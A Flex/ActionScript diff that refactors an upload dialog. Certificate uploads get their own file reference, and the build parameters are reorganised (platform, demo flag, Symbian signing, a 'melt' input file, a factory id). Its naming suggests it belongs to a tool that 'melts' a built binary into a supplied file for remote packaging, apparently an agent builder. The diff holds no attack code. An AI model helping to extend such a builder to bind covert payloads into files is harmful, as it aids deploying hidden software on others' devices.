@@ -21,6 +21,7 @@
       private var fileReference:FileReference;
       
       private var keyReference:FileReference;
+      private var certReference:FileReference;
       
       private var params:Object;
 
@@ -98,16 +99,13 @@
       {
         PopUpManager.removePopUp(uploadPopup);
         
-        if (!params) {
-          params = {platform: parentDocument.platform, binary: {demo: createBtn.demo.selected}, melt: {input: event.data, filename: fileName.text}, 'package': {type: 'remote'} };
-        } else {
-          // symbian case
-          params['melt'] = {input: event.data, filename: fileName.text}
-        }
+        if (!params)
+          params = {platform: parentDocument.platform, binary: {demo: createBtn.demo.selected}, sign: {}, 'package': {type: 'remote'} };
         
         if (currentState == 'fileSelectedSymbian')
           params['sign']['edition'] = edition.selectedItem;
         
+        params['melt'] = {input: event.data, filename: fileName.text};
         params['factory'] = {_id: parentDocument.factory._id};
         
         var filename:String = parentDocument.factory.name + "_" + parentDocument.platform + '_melted.zip'
@@ -133,13 +131,13 @@
             
       private function uploadCert(event:Event):void
       {
-        fileReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
-        fileReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
-        fileReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
-        fileReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onCertUploadComplete);
+        certReference.addEventListener(HTTPStatusEvent.HTTP_STATUS, onUploadError);
+        certReference.addEventListener(IOErrorEvent.IO_ERROR, onUploadError);
+        certReference.addEventListener(SecurityErrorEvent.SECURITY_ERROR, onUploadError);
+        certReference.addEventListener(DataEvent.UPLOAD_COMPLETE_DATA, onCertUploadComplete);
         
         uploadPopup=PopUpManager.createPopUp(this.parentDocument as DisplayObject, UploadPopup, true) as UploadPopup;
-        uploadPopup.fileReference=fileReference;
+        uploadPopup.fileReference=certReference;
         PopUpManager.centerPopUp(uploadPopup);
       }
       
@@ -171,15 +169,16 @@
         if(!params)
           params = {platform: 'symbian', binary: {demo: createBtn.demo.selected}, sign: {edition: 'symbian3'}};
         
-        fileReference=new FileReference();
-        fileReference.addEventListener(Event.SELECT, uploadCert);
-        fileReference.browse([new FileFilter("Cer", "*.cer")]);
+        certReference=new FileReference();
+        certReference.addEventListener(Event.SELECT, uploadCert);
+        certReference.browse([new FileFilter("Cer", "*.cer")]);
       }
       
       private function browseForKey():void
       {
         if(!params)
           params = {platform: 'symbian', binary: {demo: createBtn.demo.selected}, sign: {edition: 'symbian3'}};
+        
         keyReference=new FileReference();
         keyReference.addEventListener(Event.SELECT, onKeySelected);
         keyReference.browse([new FileFilter("Key", "*.key")]);
